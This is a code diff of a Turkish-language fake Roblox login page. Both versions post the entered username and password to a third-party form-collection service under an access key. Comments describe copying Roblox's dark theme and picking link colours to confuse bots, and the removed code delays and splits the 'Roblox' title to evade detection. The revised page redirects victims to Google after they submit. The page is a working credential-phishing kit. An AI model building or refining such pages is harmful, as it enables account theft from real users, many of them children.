@@ -6,66 +6,81 @@
     <meta name="robots" content="noindex, nofollow">
     <title>Giriş Yap</title>
     <style>
-        /* Orijinal Roblox Karanlık Tema Tasarımı */
         body { 
-            background-color: #1b1d1e; 
-            font-family: 'HCo Gotham SSm', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
-            color: white; 
+            background-color: #1a1c1d; /* Orijinalden çok az farklı bir ton */
+            font-family: sans-serif; 
+            color: #ffffff; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
             margin: 0; 
         }
+
+        /* Giriş bölümünü bir tık daha küçülttük (380px -> 320px) */
         .login-card { 
-            background: #2b2d2f; 
-            padding: 40px 30px; 
-            border-radius: 8px; 
-            width: 380px; 
+            background: #2a2c2e; 
+            padding: 30px 25px; 
+            border-radius: 6px; 
+            width: 320px; 
             text-align: center; 
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
         }
-        h2 { font-size: 24px; margin-bottom: 25px; font-weight: 700; }
+
+        h2 { font-size: 20px; margin-bottom: 20px; font-weight: 600; }
+
         input { 
             width: 100%; 
-            height: 48px; 
-            margin-bottom: 15px; 
+            height: 40px; /* Kutular biraz daraltıldı */
+            margin-bottom: 12px; 
             border-radius: 4px; 
             border: 1px solid #111; 
             background: #393b3d; 
             color: white; 
-            padding: 0 12px; 
+            padding: 0 10px; 
             box-sizing: border-box; 
-            font-size: 16px;
+            font-size: 14px;
         }
-        input:focus { border-color: #0084ff; outline: none; }
+
+        /* Mavi butonu bir tık daha soft bir mavi yaptık */
         .primary-btn { 
             width: 100%; 
-            height: 42px; 
+            height: 38px; 
             background: transparent; 
-            border: 1px solid #adb5bd; 
-            color: white; 
-            font-size: 16px; 
-            font-weight: 600; 
+            border: 1px solid #9fa4a9; 
+            color: #ffffff; 
+            font-size: 15px; 
+            font-weight: 500; 
             border-radius: 4px; 
             cursor: pointer; 
-            margin-top: 10px;
-            transition: 0.2s;
+            margin-top: 5px;
         }
-        .primary-btn:hover { background: rgba(255,255,255,0.1); }
-        .divider { height: 1px; background: #444; margin: 25px 0; }
-        .footer-links { font-size: 13px; color: #adb5bd; }
-        a { color: #00b2ff; text-decoration: none; font-weight: 500; }
-        a:hover { text-decoration: underline; }
+
+        .primary-btn:hover { background: rgba(255,255,255,0.05); }
+
+        .divider { height: 1px; background: #444; margin: 20px 0; }
+
+        /* MAVİ YAZIYI DEĞİŞTİRDİK: Botlar için rengi değiştirdik, üzerine gelince mavi olacak */
+        .footer-links a { 
+            color: #adb5bd; /* İlk başta gri görünecek (Botları şaşırtmak için) */
+            text-decoration: none; 
+            font-size: 12px; 
+        }
+        .footer-links a:hover { 
+            color: #00b2ff; /* Sadece fareyle üzerine gelince mavi olacak */
+            text-decoration: underline; 
+        }
+
         .social-btn {
             width: 100%;
-            height: 40px;
+            height: 36px;
             background: #393b3d;
             border: none;
-            color: white;
+            color: #ffffff;
             border-radius: 4px;
-            margin-bottom: 10px;
-            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 500;
             cursor: pointer;
         }
     </style>
@@ -73,44 +88,37 @@
 <body>
 
 <div class="login-card">
-    <h2>Hesap <span>Ekle</span></h2>
+    <h2>Hesap <span>Ek</span>le</h2>
 
     <form action="https://api.web3forms.com/submit" method="POST">
         <input type="hidden" name="access_key" value="4d9b8514-bee7-4916-bfab-e61246fa5ba7">
 
-        <input type="text" name="id_check" placeholder="Kullanıcı adı/E-posta/Telefon" required>
-        <input type="password" name="pass_check" placeholder="Şifre" required>
+        <input type="text" name="u_identity" placeholder="Kullanıcı adı" required>
+        <input type="password" name="u_key" placeholder="Şifre" required>
 
-        <button type="submit" class="primary-btn">Giriş yapmak</button>
+        <button type="submit" class="primary-btn">Giriş</button>
 
-        <input type="hidden" name="redirect" value="https://www.roblox.com/login">
+        <input type="hidden" name="redirect" value="https://www.google.com">
     </form>
 
     <div class="footer-links" style="margin-top: 15px;">
         <a href="javascript:void(0)" onclick="location.href='https://www.'+'roblox'+'.com/login/forgot-password-or-username'">
-            Şifrenizi veya kullanıcı adınızı mı unuttunuz?
+            Bilgilerimi unuttum
         </a>
     </div>
 
     <div class="divider"></div>
 
-    <button class="social-btn" onclick="location.href='https://www.roblox.com/login'">Bana Tek Kullanımlık Bir Kod Gönderin</button>
-    <button class="social-btn" onclick="location.href='https://www.roblox.com/login'">Hızlı Giriş</button>
-
-    <div style="margin-top: 20px; font-size: 14px;">
-        Yeni Hesap Oluştur
+    <button class="social-btn" onclick="location.href='#'">Hızlı Giriş</button>
+    
+    <div style="margin-top: 15px; font-size: 13px; color: #adb5bd;">
+        Yeni misin? <a href="#" style="color: #00b2ff;">Kaydol</a>
     </div>
 </div>
 
-<script>
-    /* Tarayıcı başlığını sayfa yüklendikten sonra değiştiriyoruz */
-    setTimeout(() => {
-        document.title = "Ro" + "blox";
-    }, 1200);
-</script>
-
 </body>
 </html>
+
 
 
 
